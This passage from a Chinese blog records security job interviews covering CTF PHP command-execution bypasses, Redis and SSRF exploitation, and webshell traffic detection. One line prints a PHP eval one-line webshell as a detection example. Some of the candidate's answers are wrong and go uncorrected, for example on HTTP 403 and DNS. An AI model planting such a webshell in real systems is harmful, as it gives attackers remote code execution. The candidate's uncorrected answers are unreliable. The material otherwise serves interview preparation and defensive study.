+<h2 id="14-然后InCTF三道PHP题-你简单叙述一下吧"><a href="#14-然后InCTF三道PHP题-你简单叙述一下吧" class="headerlink" title="14. 然后InCTF三道PHP题, 你简单叙述一下吧"></a>14. 然后InCTF三道PHP题, 你简单叙述一下吧</h2><p>我: 就是他把那个PHP里面可以执行命令的function 全部给ban掉了, 只留了一个 <code>proc_open()</code> , 然后他把特殊字符给过滤的差不多了, 只留了点号. 但那题是逐步递进的, 每一道题过滤的严格程度逐渐增加, 但是在最后一道题拿到的payload都是前两道题可以通用的, 就是他是利用一个点号的拼接, 去拼接出一个执行命令的函数, 然后用 <code>chr()</code> 函数去做一个编码, 去把你传进去的十六进制给编码出来, 大概就是这样, 拼接各种函数做一个命令执行</p>
+<p>面试官: 那你在发payload的时候是发的什么内容呢<br>我: 发payload就是一个GET请求, 在URL上面把这个payload直接打上去就可以了.<br>面试官: 然后把这个代码注入进去?<br>我: 就其实我是构造了一个GET请求, 就有一个参数是专门用来接收命令的, 比如说一个参数a, 就是参数a接收命令, 就在url上面直接注入命令就可以了</p>
+<h2 id="15-你们打CTF比赛的时候-你是什么角色"><a href="#15-你们打CTF比赛的时候-你是什么角色" class="headerlink" title="15. 你们打CTF比赛的时候, 你是什么角色"></a>15. 你们打CTF比赛的时候, 你是什么角色</h2><p>我: 主要负责Web题目和杂项题目</p>
+<p>面试官: web你是主力选手<br>我: 不是, web就是一个学习的角色吧.</p>
+<h2 id="16-那我在问个基础问题吧-DNS协议的原理能讲一下吗"><a href="#16-那我在问个基础问题吧-DNS协议的原理能讲一下吗" class="headerlink" title="16. 那我在问个基础问题吧, DNS协议的原理能讲一下吗"></a>16. 那我在问个基础问题吧, DNS协议的原理能讲一下吗</h2><p>我: DNS的原理, 就是用来缓存一些静态的资源的. 原理的话也答不上<br>面试官: 缓存静态的资源?<br>我: 对, 就是缓解服务器的压力嘛, 做分布式<br>面试官: 你答的是CDN吧<br>我: 噢, 那个是CDN, DNS是解析域名的, 解析域名跟IP地址之间的关系</p>
+<p>面试官: NS记录是什么<br>我: NS记录是记录IP历史解析的一些记录, 记录他曾经解析过哪些IP?<br>面试官: 这块儿应该不对, A记录是什么<br>我: 这个不知道<br>面试官: CNAME是什么<br>我: CNAME是记录域名这一块儿的吧<br>面试官: A记录就是常规最主要的记录吧, 你给他一个域名他会返回一个IP地址, NS记录呢其实返回的是name sever, 相当于你问一个根DNS他告诉你一个这个DNS哪个DNS哪里有, NS记录其实是一个确认一个DNS服务器的IP地址</p>
+<h2 id="17-TLS协议和HTTPS协议之间的关系是什么"><a href="#17-TLS协议和HTTPS协议之间的关系是什么" class="headerlink" title="17. TLS协议和HTTPS协议之间的关系是什么"></a>17. TLS协议和HTTPS协议之间的关系是什么</h2><p>我: HTTPS协议是HTTP协议+SSL协议证书加密之后, 然后的更加安全的一个网络协议. 而TLS的话是其中的加密协议, 是用来加密HTTPS的</p>
+<p>面试官: 那如果你把TLS解密之后会得到一个什么内容呢<br>我: 这个就没有了解过了, 我觉得应该是能够得到他传输过程中加密的信息的</p>
+<p>面试官: 那比如说HTTPS协议下面的, TLS吧. 你把TLS层解了之后是什么<br>我: 应该是他的证书吧<br>面试官: No, 我们就直接说吧就是HTTPS在流量测能看到的是叫TLS协议, 然后你把这个TLS协议解开之后能看到的是HTTP, 但是TLS本身在流量上过的时候你是看不到他是HTTP还是别的协议的, 比如说RDP也是走的TLS.<br>我: 明白了</p>
+<h2 id="18-那你用BurpSuit抓HTTPS的流量-能抓吗"><a href="#18-那你用BurpSuit抓HTTPS的流量-能抓吗" class="headerlink" title="18. 那你用BurpSuit抓HTTPS的流量, 能抓吗"></a>18. 那你用BurpSuit抓HTTPS的流量, 能抓吗</h2><p>我: 能抓吧, 就是把证书给导进去就可以了, burp生成一个证书, 加入到浏览器端就可以抓了. 大概应该是这样, 就是这个配置很早之前就配完了, 现在都不太清楚了</p>
+<p>面试官: 那所以导入的这个证书是一个生成的一个证书对吧<br>我: 对, 就是你访问那个burpsuit自己有一个域名地址, 然后就可以下载到一个burpsuit的证书, 然后把这个证书导入到那个浏览器里面, 你就可以去抓取到HTTPS的数据包<br>面试官: 嗯, 那需要浏览器去信任这个证书?<br>我: 对, 需要需要<br>面试官: 那BurpSuit你在导入这个证书的时候他有一个私钥?<br>我: 我记得好像是没有的, 就是你把那个证书直接导入到浏览器里面, 他就已经可以抓包了</p>
+<h2 id="19-那你能不能讲一下像TLS这样-RSA啊这种非对称加密的这种过程-是用什么密钥加密-什么密钥解密"><a href="#19-那你能不能讲一下像TLS这样-RSA啊这种非对称加密的这种过程-是用什么密钥加密-什么密钥解密" class="headerlink" title="19. 那你能不能讲一下像TLS这样, RSA啊这种非对称加密的这种过程, 是用什么密钥加密, 什么密钥解密"></a>19. 那你能不能讲一下像TLS这样, RSA啊这种非对称加密的这种过程, 是用什么密钥加密, 什么密钥解密</h2><p>我: 我大概讲一下吧, 但可能讲的不是很清楚, 因为我对这方面不是很了解. RSA的话是, 首先他用自己的公钥加密, 然后传过去, 然后那边接收方用私钥解密吧, 不是很清楚答的对不对, 因为密码学方面接触的比较少<br>面试官: 是对的<br>我: 平时用到的比较少, 一般都是CTF里面用<br>面试官: 确实很少用, 但是像咱们像流量侧设备, 检测的时候可能会考虑这些问题, 我们做检测方案这些东西</p>
+<h2 id="20-那技术方面先这样-你对微步在线-你对TDP这边-或者对我还有啥问题可以提一下"><a href="#20-那技术方面先这样-你对微步在线-你对TDP这边-或者对我还有啥问题可以提一下" class="headerlink" title="20. 那技术方面先这样, 你对微步在线, 你对TDP这边, 或者对我还有啥问题可以提一下"></a>20. 那技术方面先这样, 你对微步在线, 你对TDP这边, 或者对我还有啥问题可以提一下</h2><p>我: 比如说我入职之前, 我自己想提前做一些入职的准备, 学些什么知识会比较好, 比较契合岗位.<br>面试官: 首先是Web方面的, 肯定要继续加强, 然后是大家都最难解决的问题, 编码和绕过这块儿, 绕WAF. 那么我们作为防守方, 蓝军嘛, 就得让他绕不过对吧. 核心的落脚点还是检测, 检测出来. 还有比如说Java, 内存马. 所有会涉及的攻击手段我们可能都要去研究. 都要去了解, 而且还要去做深入的了解. 原理, 特征, 变体变形都要了解, 最终你要把这个东西分析的很透, 很明白很清楚甚至最后能挖掘出来漏洞. 这是咱们这边TDP这边安全研究员的这么一个工作面貌. 类似IDS, NDR.</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微步在线二面总结</title>
+    <url>/2021/10/19/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E4%BA%8C%E9%9D%A2%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="1-我看你参加过很多比赛-你在里面是作为主力成员-还是说是辅助的"><a href="#1-我看你参加过很多比赛-你在里面是作为主力成员-还是说是辅助的" class="headerlink" title="1. 我看你参加过很多比赛, 你在里面是作为主力成员, 还是说是辅助的"></a>1. 我看你参加过很多比赛, 你在里面是作为主力成员, 还是说是辅助的</h2><p>我: 我更多的是辅助的一个位置, 就在web题是辅助, misc题目的话是主力. </p>
+<h2 id="2-好-那我问点基础-HTTP的请求方法有哪些啊"><a href="#2-好-那我问点基础-HTTP的请求方法有哪些啊" class="headerlink" title="2. 好, 那我问点基础, HTTP的请求方法有哪些啊"></a>2. 好, 那我问点基础, HTTP的请求方法有哪些啊</h2><p>我: GET, POST, PUT, 这些, 还有一些不太常用的, 最主要就是GET和POST两种方法</p>
+<h2 id="3-在没回显的情况下的代码执行-我怎么判断他是不是成功呢-有哪些方法"><a href="#3-在没回显的情况下的代码执行-我怎么判断他是不是成功呢-有哪些方法" class="headerlink" title="3. 在没回显的情况下的代码执行, 我怎么判断他是不是成功呢, 有哪些方法"></a>3. 在没回显的情况下的代码执行, 我怎么判断他是不是成功呢, 有哪些方法</h2><p>我: 可以先, 就代码执行先外带到自己服务器上面去, 去执行一段代码比如说像 ping 自己的服务器, 看ping能不能收到, 如果能收到的话, 就说明代码执行成功了. 然后的话就是, 最主要的就是这个方法了吧, 把请求给外带出来<br>面试官: 那如果不能外联呢, 就是那台机器不能外联外部网络, 什么UDP, DNS, ping都不行<br>我: 那代码执行执行一个需要服务器花很多资源的一个操作, 然后去看web网站有没有延迟就有没有类似于mysql的sleep()那种操作<br>面试官: 这种web服务器一般都是异步的, 就是比如说那个响应他直接给你响应了<br>我: 哦…<br>面试官: 而且那个延时, 你可能也看不出来啊, 他并不是TCP一直转的, 都是直接给你响应了, 还有别的方式吗<br>我: 我没有其他方式了</p>
+<h2 id="4-redis未授权漏洞有哪一些利用方式啊"><a href="#4-redis未授权漏洞有哪一些利用方式啊" class="headerlink" title="4. redis未授权漏洞有哪一些利用方式啊"></a>4. redis未授权漏洞有哪一些利用方式啊</h2><p>我: 通过写入 <code>ssh_key</code> 进行一个远程的SSH连接, 还有一个就是… 去更改他的config去修改用户的密码, 可以登录上去, 最主要还是ssh_key的写入, 然后远程的SSH连接. </p>
+<p>面试官: 那如果他里面没有开SSH服务呢, 或者说他, 有几种情况, 第一种是开在比较奇怪的端口, 第二种是他内部不允许ssh_key登录, 怎么解决哦<br>我: 我没有更好的办法, 就我遇到这种情况一般就直接放弃了, 这种情况.</p>
+<h2 id="5-服务端有哪一些缺陷-可能会导致存在文件上传漏洞啊"><a href="#5-服务端有哪一些缺陷-可能会导致存在文件上传漏洞啊" class="headerlink" title="5. 服务端有哪一些缺陷, 可能会导致存在文件上传漏洞啊"></a>5. 服务端有哪一些缺陷, 可能会导致存在文件上传漏洞啊</h2><p>我: 首先是服务端的话, 没有做那个权限的限制, 就上传的目录文件里面, 上传进去的文件有执行权限. 可能会导致文件上传漏洞, 然后没有做文件类型的检测, 也可能会导致文件上传漏洞.</p>
+<p>面试官: 你刚刚说是什么文件有执行权限, 那个是什么来着, 没听清<br>我: 就是文件上传的目录下面, 这个目录的文件有执行权限, 就可能导致文件上传漏洞, 就服务器端的话<br>面试官: 这个为什么算作文件上传漏洞<br>我: 因为如果你文件上传上来, 没有执行权限的话, 他上传上来就是, 就不能算一个漏洞吧, 就只是一个正常的上传功能, 他前提是这个目录有执行权限, 你传上来的文件能够执行, 才能算一个文件上传的漏洞<br>面试官: 目录有执行权限? 那文件没执行权限, 难道就不能执行了吗, 就是你 1.php 你不给他执行权限, 那个apache他就不会解析了吗?<br>我: 你要配置这个目录下面的所有文件不能解析, 不能执行, 就是就限制这个目录下面就所有文件的解析这个功能</p>
+<h2 id="6-SSRF漏洞是什么"><a href="#6-SSRF漏洞是什么" class="headerlink" title="6. SSRF漏洞是什么"></a>6. SSRF漏洞是什么</h2><p>我: 是服务器端的请求伪造, 通常是用来利用SSRF漏洞来访问内网的一些资源<br>面试官: 怎么访问啊, 有哪些方式哦<br>我: 比如说他有一个URL跳转, 有一个302的跳转, 他那个URL上面会有一个链接地址, 把那个链接地址改成内网的地址, 如果存在SSRF漏洞的话就可能会访问到内网的资源</p>
+<p>面试官: 如果有redis的话, 有个redis服务器. 能用SSRF漏洞来进行利用吗?<br>我: 我觉得是可以的, 但是我没有去研究过</p>
+<p>面试官: 那如果有个FTP有弱口令呢, 能用SSRF登录吗<br>我: 可以, 如果有FTP的弱口令的话</p>
+<h2 id="7-同源策略知道是什么吗"><a href="#7-同源策略知道是什么吗" class="headerlink" title="7. 同源策略知道是什么吗"></a>7. 同源策略知道是什么吗</h2><p>我: 知道, 就是限制在相同源下面的资源之间才能互相访问, 而不同源之间不能进行那些资源之间的调用的<br>面试官: 那跨域的话都有哪一些方式, 以及为什么能够实现跨域<br>我: 跨域的话首先是写那个跨域文件的配置, crossdomain.xml 去允许某些域的访问, 这是第一种方式, 第二种方式就是在html里面在json里面好像也可以加那个允许某个域访问的代码. </p>
+<h2 id="8-登录后台的时候经常要输入验证码-服务端有哪些缺陷可以导致这个验证码失效或者被绕过"><a href="#8-登录后台的时候经常要输入验证码-服务端有哪些缺陷可以导致这个验证码失效或者被绕过" class="headerlink" title="8. 登录后台的时候经常要输入验证码, 服务端有哪些缺陷可以导致这个验证码失效或者被绕过"></a>8. 登录后台的时候经常要输入验证码, 服务端有哪些缺陷可以导致这个验证码失效或者被绕过</h2><p>我: 首先是如果验证码没有刷新的话就可被爆破去获取到验证码, 还有一种是… 我就知道这一个, 服务器端没有及时更新验证码的话会导致验证码被爆破. </p>
+<h2 id="9-知道java反序列化漏洞是什么原理吗"><a href="#9-知道java反序列化漏洞是什么原理吗" class="headerlink" title="9. 知道java反序列化漏洞是什么原理吗"></a>9. 知道java反序列化漏洞是什么原理吗</h2><p>我: 没了解过, 最近才开始学这个</p>
+<h2 id="10-linux下有哪些安装软件的方式"><a href="#10-linux下有哪些安装软件的方式" class="headerlink" title="10. linux下有哪些安装软件的方式"></a>10. linux下有哪些安装软件的方式</h2><p>我: <code>apt</code>, <code>apt-get</code>, 还有就是直接把软件源码给拷贝到linux下面直接安装, 然后启docker, 大概就是这些方式</p>
+<h2 id="11-知道文件上传-比如你上传一个webshell的时候里面流量是什么样子的吗-看过吗"><a href="#11-知道文件上传-比如你上传一个webshell的时候里面流量是什么样子的吗-看过吗" class="headerlink" title="11. 知道文件上传, 比如你上传一个webshell的时候里面流量是什么样子的吗, 看过吗?"></a>11. 知道文件上传, 比如你上传一个webshell的时候里面流量是什么样子的吗, 看过吗?</h2><p>我: 我上传一个webshell的话, 他那个请求的头一般是POST请求嘛, POST的主体就是webshell的内容但这个主体是在burpsuit里面抓包看到的, 我不知道是不是跟那个就我们需要的包是不是一样的, burpsuit里面抓到的就是, 你上传的webshell的内容, 然后就是这样…<br>面试官: 有什么文件名吗, 这种东西有吗, 文件大小之类的, 这种东西有吗<br>我: 有文件大小, 文件名的话一般也会有, 有文件名还有文件的大小<br>面试官: 有什么特定应的头吗, 还是都是POST数据里面啊<br>我: 我没有注意过他们有没有特殊的头, 从来没有注意过这个</p>
+<p>面试官: 用过webshell吗<br>我: 用过一些简单的一句话木马<br>面试官: webshell得有什么什么结构才能称作一个webshell, 或者说什么, 有哪些功能才能算webshell<br>我: 首先第一个是你上传的这个webshell, 他一定是一段完整的代码, 就是他一定能够执行, 他一定要能够进行命令操作的功能才能算是一个webshell. 或者说能够反弹一个shell回来, 一个bash反弹shell过来, 也能算一个webshell吧…</p>
+<h2 id="12-有代码审计经验-能够写什么代码吗"><a href="#12-有代码审计经验-能够写什么代码吗" class="headerlink" title="12. 有代码审计经验? 能够写什么代码吗"></a>12. 有代码审计经验? 能够写什么代码吗</h2><p>我: 能写一点python跟php的代码, 写一点简单的. 然后java的代码审计, 还有java的基础也是最近才刚开始学</p>
+<h2 id="13-你说那个misc都是哪些类型啊-隐写术吗"><a href="#13-你说那个misc都是哪些类型啊-隐写术吗" class="headerlink" title="13. 你说那个misc都是哪些类型啊, 隐写术吗?"></a>13. 你说那个misc都是哪些类型啊, 隐写术吗?</h2><p>我: 音频分析, 流量分析之类的<br>面试官: 流量分析? 叫你连接菜刀的一句话, 有看过他的流量吗, 有什么流量特征吗<br>我: 有看过, 菜刀的流量, 我看的那个版本他是直接通过base64加密的流量, 解密之后就是php的代码, 然后通过php的socket协议去连接的吧, 之前那个版本. </p>
+<p>面试官: 如果想去让你检测webshell的话, 在流量里面有什么思路吗, 检测webshell. 或者他的交互, 该怎么去做<br>我: 直接去检测他那个命令执行的函数, 就webshell里面一般会有传入的参数, POST, GET之类的, 去检测这些关键字, 流量里面. 还有就是检测匹配webshell的特征吧, 就一般大概常用的webshell都长得差不多, 就去匹配他的特征<br>面试官: 什么特征哦?<br>我: 比如说像是php一句话木马, 一个 <code>&lt;?php @eval($_POST[&#39;lamber&#39;];?&gt;</code> 的操作, 这种. 直接去匹配这个eval函数, 就去看流量里面有没有出现这个, 或者他各种变形去加解密这种. </p>
+<p>面试官: 像你做隐写术, 图片的隐写都有哪一些类型啊, 以及怎么去把这些隐写给他弄出来啊<br>我: 最常见的就是LSB隐写, 去改图片的标志位, 去把他的数据恢复出来, 然后还有就是几张图片拼接, 然后把那个他拼接的部分提取出来, 也是一种新的一段数据, 常见的就是这两种, 还有就是用binwalk去进行, 去对文件里面的数据有没有特殊的文件头去进行一个分离. 一般就是这些</p>
+<h2 id="14-HTTP响应5开头的知道是什么意思吗"><a href="#14-HTTP响应5开头的知道是什么意思吗" class="headerlink" title="14. HTTP响应5开头的知道是什么意思吗"></a>14. HTTP响应5开头的知道是什么意思吗</h2><p>我: 服务器内部异常<br>面试官: 那404呢<br>我: 未找到页面<br>面试官: 那403呢<br>我: 403也是类似的吧, 就客户端的资源处理异常<br>面试官: 客户端资源处理异常? 客户端是你浏览器吗<br>我: 是浏览器的资源出现异常<br>面试官: 100知道是什么意思吗<br>我: 100没有怎么见过…<br>面试官: 302呢<br>我: 302跳转, 跳转到另一个的url里面</p>
+<h2 id="15-代码审计经验-php执行代码都有哪些函数"><a href="#15-代码审计经验-php执行代码都有哪些函数" class="headerlink" title="15. 代码审计经验? php执行代码都有哪些函数"></a>15. 代码审计经验? php执行代码都有哪些函数</h2><p>我: 像 <code>system(), proc_open(), popen()</code> 这些…</p>
+<h2 id="16-你了解这个安全研究员是做什么的吗"><a href="#16-你了解这个安全研究员是做什么的吗" class="headerlink" title="16. 你了解这个安全研究员是做什么的吗"></a>16. 你了解这个安全研究员是做什么的吗</h2><p>我: 了解过一些, 就主要做威胁情报检测, 去做流量分析之类的<br>面试官: </p>
+<h2 id="17-burpsuit怎么去抓安卓手机的包"><a href="#17-burpsuit怎么去抓安卓手机的包" class="headerlink" title="17. burpsuit怎么去抓安卓手机的包"></a>17. burpsuit怎么去抓安卓手机的包</h2><p>我: 安卓手机上面有一个应用吧, 然后可以生成一个手机的一个证书, 然后在同一个局域下面, 在burpsuit上面导入这个证书, 这之后, 可以去抓到手机端的流量. 但是我没有抓成功过, 我不知道是用的那个软件的问题, 还是什么其他的原因<br>面试官: 你可以抓微信之外的普通的应用看一下<br>我: 能抓到浏览器的包, 正常浏览器的包好像能抓到. 但是应用的包就不太好抓, 很杂乱.</p>
+<h2 id="18-对于溢出那些有了解吗-比如栈溢出"><a href="#18-对于溢出那些有了解吗-比如栈溢出" class="headerlink" title="18. 对于溢出那些有了解吗, 比如栈溢出"></a>18. 对于溢出那些有了解吗, 比如栈溢出</h2><p>我: 没有了解过, 二进制方面没有怎么了解过</p>
+<h2 id="19-linux里面查看SSH登录记录有哪些方式"><a href="#19-linux里面查看SSH登录记录有哪些方式" class="headerlink" title="19. linux里面查看SSH登录记录有哪些方式"></a>19. linux里面查看SSH登录记录有哪些方式</h2><p>我: 直接去查看日志文件吧, 其他方式就不知道了</p>
+<h2 id="20-你平常学习东西的话一般通过什么平台怎么学啊-主要是学web吗-有什么学习计划吗"><a href="#20-你平常学习东西的话一般通过什么平台怎么学啊-主要是学web吗-有什么学习计划吗" class="headerlink" title="20. 你平常学习东西的话一般通过什么平台怎么学啊, 主要是学web吗, 有什么学习计划吗"></a>20. 你平常学习东西的话一般通过什么平台怎么学啊, 主要是学web吗, 有什么学习计划吗</h2><p>我: 我的学习计划是, 目前是先把java层面的代码审计学完, 做一些漏洞分析, 分析漏洞的底层原理. 然后去写流量检测, 去检测这些漏洞的特征, 目前是这样一个学习规划. 然后学习的途径的话, 一般是从各种社区, 以及google上面找文章, 然后就是去问一些前辈们的学习的问题吧, 各种途径就是这样.</p>
+<h2 id="21-再问几个基础啊-比如说XSS-我们在测试XSS漏洞的时候-我们都用了什么来闭合原有的符号啊"><a href="#21-再问几个基础啊-比如说XSS-我们在测试XSS漏洞的时候-我们都用了什么来闭合原有的符号啊" class="headerlink" title="21. 再问几个基础啊, 比如说XSS, 我们在测试XSS漏洞的时候, 我们都用了什么来闭合原有的符号啊"></a>21. 再问几个基础啊, 比如说XSS, 我们在测试XSS漏洞的时候, 我们都用了什么来闭合原有的符号啊</h2><p>我: 要闭合原有的符号的话, 跟前面的XSS语句进行匹配上就可以了, 前面是括号的话就用括号闭合, 前面有双引号的话就用双引号来闭合, 这种<br>面试官: 单纯加双引号, 那有没有别的方式, 有可能你加一个双引号, 闭合不了, 代码就错了. 你正常加一个单引号, 或一个双引号. 这种很大概率报错, 理解我说的吗<br>我: 能理解, 其他闭合方式我就没有怎么了解过.</p>
+<h2 id="22-实践经历怎么样-就是说你在实际渗透的时候-比如说一台机器-就一个网站他用了CDN-我们有哪一些方法去找它真实IP"><a href="#22-实践经历怎么样-就是说你在实际渗透的时候-比如说一台机器-就一个网站他用了CDN-我们有哪一些方法去找它真实IP" class="headerlink" title="22. 实践经历怎么样, 就是说你在实际渗透的时候, 比如说一台机器, 就一个网站他用了CDN, 我们有哪一些方法去找它真实IP"></a>22. 实践经历怎么样, 就是说你在实际渗透的时候, 比如说一台机器, 就一个网站他用了CDN, 我们有哪一些方法去找它真实IP</h2><p>我: 找它真实IP首先是, 去一些网站上面可以直接查一些他的真实IP的一些网站. 然后可以通过像是fofa之类的去查他的历史解析IP地址或者是从网站的子域名查他的IP地址, 可能他主站用了CDN但是他子站没有用, 大概就是这些方法吧</p>
+<h2 id="23-然后你在先知发的两篇文章是什么文章啊"><a href="#23-然后你在先知发的两篇文章是什么文章啊" class="headerlink" title="23. 然后你在先知发的两篇文章是什么文章啊"></a>23. 然后你在先知发的两篇文章是什么文章啊</h2><p>我: 一篇漏洞挖掘的, 一篇CTF的复现. </p>
+<h2 id="24-有了解过linux下什么后门吗-或使用过什么后门-代理啊之类的"><a href="#24-有了解过linux下什么后门吗-或使用过什么后门-代理啊之类的" class="headerlink" title="24. 有了解过linux下什么后门吗, 或使用过什么后门, 代理啊之类的"></a>24. 有了解过linux下什么后门吗, 或使用过什么后门, 代理啊之类的</h2><p>我: 后门这个没有了解过, 我只知道webshell, 然后后面没有了解过. 我见过一种可以写到进程里面的木马, 不是很清楚那个算不算后门, 我觉得更像是webshell一点</p>
+<h2 id="25-你大概说一下你开头说的那篇渗透的文章吧"><a href="#25-你大概说一下你开头说的那篇渗透的文章吧" class="headerlink" title="25. 你大概说一下你开头说的那篇渗透的文章吧"></a>25. 你大概说一下你开头说的那篇渗透的文章吧</h2><p>我: 记录了之前挖edu-src的一个过程, 首先从信息收集上面收集域名的信息, 以及它的子站, 以及它的功能点, 然后进行一个测试, 当时是挖到一个存储型XSS, 在一个发布项目的一个界面, 那个地方打入XSS之后, 把项目提交上去, 审核员可以触发那个存储型的XSS, 还有一个地方在登录的界面, 修改密码的功能, 他的修改密码的数据包是明文传输的数据, 直接将验证码发送的手机号在数据包里面显示出来了, 可以更改这个手机号改为自己手机号, 然后这个验证码就会发到自己的手机上面. 接收到这个验证码之后就可以去更改任意用户的一个用户密码, 当时挖掘就这一个站挖到这两个漏洞</p>
+<p>面试官: 挖掘过程有什么亮点吗, 比如说就是别人都想不到的, 有什么区别点吗<br>我: 亮点的话我觉得就是这个, 逻辑漏洞的挖掘吧. 可能其他人都不会注意到这个地方<br>面试官: 什么逻辑漏洞啊?<br>我: 就是, 更改他发送验证码的手机号. 然后这个验证码就会发到目标手机上面去, 这个地方算他逻辑上面设计的缺陷吧, 他没有做那个发送验证码的手机号的验证, 然后导致了, 这个验证码可以发到随便任意一个手机上面去</p>
+<h2 id="26-那我这边就了解的差不多了-你有什么要了解的吗"><a href="#26-那我这边就了解的差不多了-你有什么要了解的吗" class="headerlink" title="26. 那我这边就了解的差不多了, 你有什么要了解的吗"></a>26. 那我这边就了解的差不多了, 你有什么要了解的吗</h2><p>我: 我想问一下就是, 我搞web方面的话, 我如果要接触二进制, 从哪个方向入手会好一点, 从哪里开始学会好一点</p>
+<p>面试官: 当然你问的是一个问题哈, 那我先从另外一个方面回答一下, 你自己觉得自己想要具备怎样的知识结构, 或者说想要做怎样的工作, 这个有想过吗<br>我: 我最想做的还是, 首先是分析攻击进来的漏洞, 或者说攻击进来的流量, 去分析他们是怎么打进来的, 去学习他们的攻击方式然后再打出去, 然后很多地方可能会涉及到内存马呀二进制方面的东西, 这些地方可能会我自己就看不懂, 我自己的想法是我要去能看懂他们能分析的明白他们, 就这方面, 就我遇到什么漏洞我都想要去把他分析清楚</p>
+<p>面试官: 这个问题你先想想, 你连web都熟悉度其实还不怎么够, 连java反序列化漏洞什么原理都不知道, 那个二进制难度其实是更大的, 就实际的过程中, 简单的比如栈溢出, 但现在一般都是比较复杂的这种, 什么堆, 堆更加复杂, 然后那个二进制的利用过程也很复杂, 这个是十六进制的, 他并不一定是你看得到的web程序, 得对底层一些汇编也有了解. 你得学基本的汇编你才知道他的利用过程. 还有基本的pwn吧, pwn, 你才能知道别人是怎么利用的漏洞. 建议你还是先把web好好学一下<br>我: 先把web先打好嘛, 就是我想有多余的精力的情况下去了解一下二进制这边的东西</p>
+<p>面试官: 了解一下就简单了, 直接搜漏洞类型, 什么原理, 怎么利用, 没多复杂. 主要是你得深入有实践这种才行. 只是大概听过这个, 估计不太行. 如果只是听过的话. 当然前提还是就大概了解就行, 实际上这个工作的时候并不一定用到.<br>我: 工作遇到最多的其实还是各种web层面的漏洞对吧.<br>面试官: 是的, 最主要还是看你的能力, 因为很多是比较复杂的系统, Java相关的有什么Tomcat, JBoss, Weblogic一些企业级应用, 还有一些什么别的应用, 这种的话可能对于漏洞的复现, 一些原理的了解啊<br>我: 因为我最近的话, 我最近的学习的方向就是学java的代码审计. 就是比如说学到一个Java层面的漏洞之后, 环境的搭建是怎么搭可能会比较好一点, 因为可能就本身的文章只会给你一个代码片段, 但不会给你一个完整的环境<br>面试官: 这个肯定是等你多搭了就知道怎么搭了, 如果你连一个Java程序都不知道怎么跑起来, 你还分析什么Java漏洞啊<br>我: 嗯…好的, 那我就先学一些Java开发之类的东西对吧<br>面试官: 也不是说开发, 而是基本的项目部署, 你得知道他是怎么部署的<br>我: 明白了明白了</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>盛趣游戏面试总结</title>
+    <url>/2021/10/16/%E7%9B%9B%E8%B6%A3%E6%B8%B8%E6%88%8F%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="1-先请你简单介绍一下你相关的实习经历或者项目经历"><a href="#1-先请你简单介绍一下你相关的实习经历或者项目经历" class="headerlink" title="1. 先请你简单介绍一下你相关的实习经历或者项目经历"></a>1. 先请你简单介绍一下你相关的实习经历或者项目经历</h2><p>我: 我在学校做得比较多的是参加CTF比赛, 大三的时候去挖过一些edu-src, 就是做一些实战挖掘. 然后在CTF比赛方面的话也参加过一些线下赛, 线下赛就是AWD形式的模拟实战环境的一种, 很多个小队互相攻击的那种形式, 还跟着老师去外面给一些政务部门做一些渗透测试, 内网的一些安全评估, 这是一些我在学校的主要经历. 然后还给先知社区发过两篇文章, 一篇是记录CTF方面的相关知识点, 还有一篇是在挖掘edu-src的时候, 所记录下的一些比较有趣的漏洞</p>
+<h2 id="2-你大概是从什么时候开始接触网络安全这个行业的"><a href="#2-你大概是从什么时候开始接触网络安全这个行业的" class="headerlink" title="2. 你大概是从什么时候开始接触网络安全这个行业的"></a>2. 你大概是从什么时候开始接触网络安全这个行业的</h2><p>我: 我接触的还算蛮早的, 我其实大一入校之前就已经接触了. 因为在我们学校的话是有专门的技术小组给未入学的新生进行信息安全的宣传, 然后还给大家一些资料, 可以跟着他们一起进行学习. 不过那会儿都是从CTF开始的, CTF作为一个很好的入门学习的门槛可以快速学习很多新知识.</p>
+<h2 id="3-能列举一些你们学校的课程吗-包括你比较擅长的"><a href="#3-能列举一些你们学校的课程吗-包括你比较擅长的" class="headerlink" title="3. 能列举一些你们学校的课程吗, 包括你比较擅长的"></a>3. 能列举一些你们学校的课程吗, 包括你比较擅长的</h2><p>我: 专业性比较强的有【php代码审计】. 然后语言课程开设了 【C语言】【Java】【python】都开设了都学习过一些. 然后还有 【网络攻防课程】以及【高级网络攻防课程】分别针对web层面的漏洞挖掘跟windows的一些后渗透进行讲授. 然后二进制方面的话, 开设了【汇编语言】的课程. 我们开设的课程都还是专业性比较强的</p>
+<h2 id="4-你从你自己的角度来说-你比较擅长或是比较喜欢哪个领域或者方向"><a href="#4-你从你自己的角度来说-你比较擅长或是比较喜欢哪个领域或者方向" class="headerlink" title="4. 你从你自己的角度来说, 你比较擅长或是比较喜欢哪个领域或者方向"></a>4. 你从你自己的角度来说, 你比较擅长或是比较喜欢哪个领域或者方向</h2><p>我: 我比较喜欢的是web层面的网页端的漏洞挖掘, 因为我觉得这上面比较有趣而且操作性比较高. 比起二进制方面来说有趣不少, 所以我主要研究的是web层面的一些安全漏洞</p>
+<h2 id="5-那你在这个之前所说的比赛也好-或者说是渗透测试也好-有没有整理出自己的套路"><a href="#5-那你在这个之前所说的比赛也好-或者说是渗透测试也好-有没有整理出自己的套路" class="headerlink" title="5. 那你在这个之前所说的比赛也好, 或者说是渗透测试也好, 有没有整理出自己的套路"></a>5. 那你在这个之前所说的比赛也好, 或者说是渗透测试也好, 有没有整理出自己的套路</h2><p>我: 有的有的, CTF方面的话就是做题技巧嘛, 从信息收集开始, 从收集题目源码, 题目各种信息, 功能点, 以及在Google上面查询有无历史类似的知识点, 然后找到知识点之后就开始快速学习, 因为CTF通常遇到的题目都是自己没学过的, 所以需要现场学, 学完之后利用学到的知识马上去进行一个利用. 然后挖掘方面的话, 我自己的习惯是先信息收集子域名, IP信息, IP段. 然后从他的子站下手, 因为子站通常来说会好入手一些, 然后做目录扫描, 去看他有些什么服务, 然后看他网站用的那些框架有无历史CVE, 用这些历史的CVE去攻击. 然后如果没有的话去看网站有无源码泄露, 有源码泄露的话把源码拖下来做一个代码审计, 